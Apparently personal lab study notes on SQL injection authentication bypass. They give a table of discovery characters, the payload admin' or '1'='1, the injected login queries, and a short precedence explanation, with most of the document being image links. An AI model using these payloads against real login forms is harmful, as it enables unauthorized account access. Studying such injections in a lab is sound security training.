## Authentication Bypass
![](Pasted%20image%2020260617173452.png)
We can log in with the administrator credentials `admin / p@ssw0rd`.
![](Pasted%20image%2020260617173501.png)

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```
![](Pasted%20image%2020260617173611.png)
## SQLi Discovery
|Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|
![](Pasted%20image%2020260617173802.png)

```sql
SELECT * FROM logins WHERE username=''' AND password = 'something';
```
## OR Injection

```sql
admin' or '1'='1
```

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
![](Pasted%20image%2020260617174003.png)
Let us break it down:

The `AND` operator is evaluated first:

- `'1'='1'` is `True`.
- `password='something'` is `False`.
- The result of the `AND` condition is `False` because `True AND False` is `False`.

Next, the `OR` operator is evaluated:

- If `username='admin'` exists, the entire query returns `True`.
- The `'1'='1'` condition is irrelevant in this context because it doesn't affect the outcome of the `AND` condition.
## Auth Bypass with OR operator
![](Pasted%20image%2020260617174118.png)
![](Pasted%20image%2020260617174130.png)
![](Pasted%20image%2020260617174206.png)
![](Pasted%20image%2020260617174235.png)
![](Pasted%20image%2020260617174253.png)
